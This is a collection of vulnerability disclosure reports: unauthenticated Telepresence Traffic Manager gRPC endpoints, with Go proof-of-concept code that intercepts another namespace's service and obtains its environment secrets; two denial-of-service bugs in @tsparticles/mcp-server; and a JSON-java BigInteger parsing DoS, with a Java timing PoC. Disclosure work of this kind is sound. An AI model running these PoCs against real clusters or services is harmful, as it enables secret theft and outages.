## Summary

Telepresence's Traffic Manager gRPC API (port 8081) requires no authentication. Any pod with cluster-network access to the Traffic Manager can register as a client in an arbitrary managed namespace and create intercepts against services in that namespace, regardless of Kubernetes RBAC. On interception the victim pod's complete container environment (secrets, tokens, API keys) is delivered to the attacker. Tested on HEAD v2.28.0, commit b2231a4.

## Details

The gRPC server is started with no auth interceptor (pkg/grpc/server/server.go). The connection uses plaintext: `grpc.WithTransportCredentials(insecure.NewCredentials())`.

`ArriveAsClient` stores the caller-supplied `Namespace` without verifying the caller is in that namespace. The only gate is whether the namespace is in the Traffic Manager's watchlist (`ManagesNamespace`):

```go
// cmd/traffic/cmd/manager/service.go:181-201
func (s *service) ArriveAsClient(..., client *rpc.ClientInfo) (*rpc.SessionInfo, error) {
    if !s.State().ManagesNamespace(ctx, client.Namespace) {
        return nil, status.Error(codes.FailedPrecondition, ...)
    }
    // No SAR, no bearer token, no kubeconfig check
    return &rpc.SessionInfo{SessionId: string(s.state.AddClient(client, ...))}, nil
}
```

`CreateIntercept` calls `managedTargetNamespace()` which also only checks `ManagesNamespace(target_ns)` — never that the target equals the client's own registered namespace (service.go:929). A session registered in namespace A can intercept namespace B as long as B is also watched. On interception, the victim pod's full container environment is forwarded via `intercept.Environment = rIReq.Environment`.

## Proof of Concept

From any pod in the cluster:

```go
conn, _ := grpc.NewClient("traffic-manager.ambassador:8081",
    grpc.WithTransportCredentials(insecure.NewCredentials()))
mgr := rpc.NewManagerClient(conn)

session, _ := mgr.ArriveAsClient(ctx, &rpc.ClientInfo{
    Name: "attacker@pod", Namespace: "payments",
    InstallId: uuid.NewString(), Product: "telepresence", Version: "2.20.0",
})

mgr.CreateIntercept(ctx, &rpc.CreateInterceptRequest{
    Session: session,
    InterceptSpec: &rpc.InterceptSpec{
        Name: "steal", Agent: "payments-api", Namespace: "payments",
        Mechanism: "tcp", Client: "attacker@pod",
    },
})
```

Supplying a namespace not in the TM watchlist returns FailedPrecondition, confirming the only gate is the watchlist check.

## Impact

Any pod operator in the cluster can intercept services in namespaces they have no Kubernetes RBAC access to, receiving all traffic and environment variables. In the default cluster-wide Traffic Manager deployment all namespaces are managed.
Secrets mounted as environment variables (database passwords, API keys, service account tokens) are exfiltrated with no audit trail on the victim namespace.

## Summary

The Traffic Manager `Tunnel` gRPC streaming endpoint accepts a session ID from the first bytes of the client-controlled message payload. No verification confirms the caller owns the session. An attacker supplying a valid active session ID receives a fully routed tunnel for that session, gaining the network routing capabilities of the legitimate Telepresence client. Tested on HEAD v2.28.0, commit b2231a4.

## Details

The `Tunnel` handler reads identity from a client-provided binary payload rather than from a verified credential or prior authenticated gRPC call:

```go
// cmd/traffic/cmd/manager/service.go:1057-1063
func (s *service) Tunnel(server grpc.BidiStreamingServer[...]) error {
    stream, err := tunnel.NewServerStream(ctx, tunnel.ClientToManager, server)
    return s.state.Tunnel(ctx, stream)  // stream.SessionID() is client-controlled
}
```

`state.Tunnel` looks up the session ID in the sessions map with no ownership proof:

```go
// cmd/traffic/cmd/manager/state/state.go:698-703
func (s *State) Tunnel(ctx context.Context, stream tunnel.Stream) error {
    id := stream.SessionID()   // from client payload bytes
    if cs, ok := s.clients.Load(id); ok {
        return s.clientTunnel(ctx, cs, stream)  // full dialer granted
    }
    return grpcErrors.Errorf(codes.NotFound, ...)
}
```

The session ID is parsed from the wire message with no binding to the transport-level identity of the caller (pkg/tunnel/message.go:209-214).

## Proof of Concept

Precondition: a valid active session ID (obtainable via ArriveAsClient, which has no auth either).

```go
conn, _ := grpc.NewClient("traffic-manager.ambassador:8081",
    grpc.WithTransportCredentials(insecure.NewCredentials()))
mgr := rpc.NewManagerClient(conn)

tunnelStream, _ := mgr.Tunnel(ctx)

// Send StreamInfo with victim session ID in payload
tunnelStream.Send(&rpc.TunnelMessage{Payload: buildStreamInfo(victimSessionID, ...)})

// Traffic Manager routes tunnel traffic for victimSessionID
// through this attacker-controlled bidirectional stream
```

## Impact

A caller supplying a valid session ID of an active Telepresence client obtains a tunnel endpoint for that session's network routing context. Session IDs are UUID4s, making cold brute-force impractical; exploitation materialises when session IDs are obtainable via log leakage or cluster-internal channels. Combined with the unauthenticated ArriveAsClient endpoint, an attacker can
create their own sessions and pivot to impersonate active developer sessions.

## Summary

The HTTP mode of `@tsparticles/mcp-server` creates a single stateful `StreamableHTTPServerTransport` instance and reuses it for all clients. The first anonymous client that initializes the MCP endpoint claims the shared transport state, and later clients cannot create their own sessions.

This was verified on `v4.3.0` at commit `0266d469aa2d719cb66a9c6bf09aded4186ec17c`. The same singleton transport pattern is still present in `v4.3.1` and current `main`.

## Affected Code

The server creates one shared transport before accepting requests:

    const transport = new StreamableHTTPServerTransport({
      sessionIdGenerator: () => randomUUID(),
    });

    const httpServer = createServer(async (req, res) => {
      ...
      await transport.handleRequest(req, res, parsedBody);
    });

Because the same transport object is reused across all requests, the first successful `initialize` call changes the state for all later clients.

## Reproduction

Send two independent `initialize` requests without a prior `mcp-session-id`.

First request:

    {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"first-client","version":"1.0.0"}}}

Second request:

    {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"second-client","version":"1.0.0"}}}

Observed result in 3 out of 3 runs:

    first response: HTTP 200 with mcp-session-id
    second response: HTTP 400
    {"jsonrpc":"2.0","error":{"code":-32600,"message":"Invalid Request: Server already initialized"},"id":null}

## Impact

An unauthenticated remote client can win the first-session race and prevent all later legitimate clients from establishing new MCP sessions until the process is restarted. The first session remains functional, but new clients are denied service.

## Recommendation

Create a transport per session or maintain a bounded session-id-to-transport map. Do not reuse one stateful transport instance for all HTTP clients.

## Summary

The HTTP mode of `@tsparticles/mcp-server` parses incoming `/mcp` request bodies with `JSON.parse()` outside a request-local error boundary. A single malformed JSON request causes the async request handler to throw and terminates the Node.js process.

This was verified on `v4.3.0` at commit `0266d469aa2d719cb66a9c6bf09aded4186ec17c`. Version `4.3.1` appears to fix this by returning HTTP 400 for invalid JSON.

## Affected Code

The vulnerable handler is:

    if (req.method === "POST" && req.url === "/mcp") {
      const body = await new Promise<string>((resolve, reject) => {
        const chunks: Buffer[] = [];
        req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
        req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
        req.on("error", reject);
      });

      const parsedBody = body ? JSON.parse(body) : undefined;
      await transport.handleRequest(req, res, parsedBody);
    }

The `JSON.parse()` call is not wrapped in `try/catch`.

## Reproduction

Start the HTTP server and send this malformed request:

    POST /mcp HTTP/1.1
    Content-Type: application/json
    Mcp-Protocol-Version: 2025-11-25

    {"jsonrpc":

Observed result in 3 out of 3 runs:

    exit_code=1
    SyntaxError: Unexpected end of JSON input
    at Server.<anonymous> (integrations/mcp-server/src/index.ts:407:38)

## Impact

An unauthenticated remote attacker can terminate the exposed MCP process with a single malformed request. The service remains unavailable until restarted by an external supervisor.

## Recommendation

Wrap request parsing in a local `try/catch` and return a bounded HTTP 400 response such as:

    {"error":"Invalid JSON"}

The process should remain alive after malformed requests.

## 1. Executive Summary

JSON-java version 20260522 contains an unguarded path from an HTTP request body to unbounded `BigInteger` and `BigDecimal` construction. `JSONTokener.nextSimpleValue()` accumulates numeric characters into a `StringBuilder` with no length cap, then passes the full string to `JSONObject.stringToNumber()`, which calls `new BigInteger(val)` or `new BigDecimal(val)` directly. Both constructors have polynomial time complexity (O(n^1.585) for `BigInteger`).

A 488 KB JSON body — well within nginx's default 1 MB body-size limit — contains a 500,000-digit numeric literal that blocks the handling thread for approximately 3 seconds. Spring Boot has no default size limit for `application/json` request bodies. No parser configuration option (`withStrictMode`, `withKeepStrings`) prevents this. All three primary entry points are affected: `new JSONObject(String)`, `new JSONArray(String)`, and `XML.toJSONObject(String)`.

This vulnerability is distinct from CVE-2023-5072 (which addressed `StackOverflowError` from deeply nested JSON *structures* via a `try/catch` in `nextValue()`) and from CVE-2022-45688 (which addressed recursive XML nesting depth). The numeric string length issue has been present since BigInteger support was introduced in release 20150729 and has never been fixed in any subsequent release.

**Attack Complexity is rated High** because successful exploitation requires the target application to be using org.json specifically (rather than the default Jackson library used by Spring Boot), and requires the developer to have explicitly passed user-controlled input to `new JSONObject()` or equivalent. These are deployment conditions beyond the attacker's control. See Section 6 for the full CVSS rationale and Section 8 for the comparison with Jackson's treatment of the same issue class.

This vulnerability was **reproduced locally against json-20260522.jar** with full evidence provided below.

## 2. Vulnerability Description

`JSONTokener.nextSimpleValue()` accumulates characters into a `StringBuilder` with no length limit until it hits a structural JSON character:

**`JSONTokener.java:500–504`:**
```java
StringBuilder sb = new StringBuilder();
while (c >= ' ' && ",:]}/\\\"[{;=#".indexOf(c) < 0) {
    sb.append(c);     // unbounded — no length check
    c = this.next();
}
```

The accumulated string is passed to `JSONObject.stringToValue()` → `stringToNumber()`, which calls `new BigInteger(val)` with zero size guard:

**`JSONObject.java:2738`:**
```java
BigInteger bi = new BigInteger(val);   // val can be arbitrarily large; no guard
```

`BigInteger(String)` has O(n^1.585) time complexity due to its internal Karatsuba multiplication during construction. A 100,000-digit input takes ~120 ms; a 1,000,000-digit input takes ~12 seconds. The decimal path (`new BigDecimal(val)`, reached when the string contains a `.` or exponent) is equally affected.

**No configuration option prevents this.** `withStrictMode(true)` and `withKeepStrings(true)` are not checked in the `nextSimpleValue()` → `stringToNumber()` call chain. Confirmed by execution: both options still produce BigInteger in ~120 ms for a 100K-digit input.

**Relationship to CVE-2023-5072:** CVE-2023-5072 (fixed in release 20231013) catches `StackOverflowError` thrown by deeply nested JSON *structures* (`{[` brackets) inside `nextValue()`:
```java
} catch (StackOverflowError e) {
    throw new JSONException("JSON Array or Object depth too large to process.", e);
}
```
This fix is in `nextValue()` and covers only recursive object/array structure depth. It has no effect on the numeric string length path in `nextSimpleValue()` → `stringToNumber()`. The BigInteger length issue was not addressed in 20231013 or in any subsequent release.

## 3. Affected Code Locations

| File | Lines | Description |
|------|-------|-------------|
| `JSONTokener.java` | 500–504 | `nextSimpleValue()` — unbounded character accumulation into `StringBuilder`, no length cap |
| `JSONObject.java` | 2721–2748 | `stringToNumber()` — `new BigInteger(val)` / `new BigDecimal(val)` called directly with no length guard |

## 4. Proof of Concept (Locally Verified)

### 4.1 POC Code

```java
import org.json.*;

public class Poc2NumericDoSv2 {
    public static void main(String[] args) {
        System.out.println("=== CVE-002: JSONTokener Unbounded Numeric String DoS ===");

        // Scaling: timing at different digit counts
        System.out.println("\n-- Unquoted numeric literal (JSONObject) --");
        int[] sizes = {10_000, 100_000, 200_000, 500_000, 1_000_000};
        for (int numLen : sizes) {
            String payload = "{\"x\":" + "9".repeat(numLen) + "}";
            long start = System.currentTimeMillis();
            JSONObject jo = new JSONObject(payload);
            long elapsed = System.currentTimeMillis() - start;
            System.out.printf("  %,7d digits (~%3d KB): %,5d ms  type=%s%n",
                numLen, payload.length()/1024, elapsed, jo.get("x").getClass().getSimpleName());
        }

        // All affected entry points
        System.out.println("\n-- All affected entry points (100K digits) --");
        String p = "9".repeat(100_000);
        long t;
        t = System.currentTimeMillis(); new JSONObject("{\"n\":" + p + "}");
        System.out.println("  new JSONObject(String):     " + (System.currentTimeMillis()-t) + " ms");
        t = System.currentTimeMillis(); new JSONArray("[" + p + "]");
        System.out.println("  new JSONArray(String):      " + (System.currentTimeMillis()-t) + " ms");
        t = System.currentTimeMillis(); XML.toJSONObject("<r>" + p + "</r>");
        System.out.println("  XML.toJSONObject(String):   " + (System.currentTimeMillis()-t) + " ms");

        // No configuration option prevents the DoS
        System.out.println("\n-- Configuration bypass attempts (100K digits) --");
        String payload100k = "{\"n\":" + p + "}";
        t = System.currentTimeMillis();
        new JSONObject(payload100k, new JSONParserConfiguration().withStrictMode(true));
        System.out.println("  withStrictMode(true):       " + (System.currentTimeMillis()-t) + " ms  [no protection]");
        t = System.currentTimeMillis();
        new JSONObject(payload100k, new JSONParserConfiguration().withKeepStrings(true));
        System.out.println("  withKeepStrings(true):      " + (System.currentTimeMillis()-t) + " ms  [no protection]");

        System.out.println("\nRESULT: [CONFIRMED VULNERABLE] No length guard exists in parsing chain.");
    }
}
```

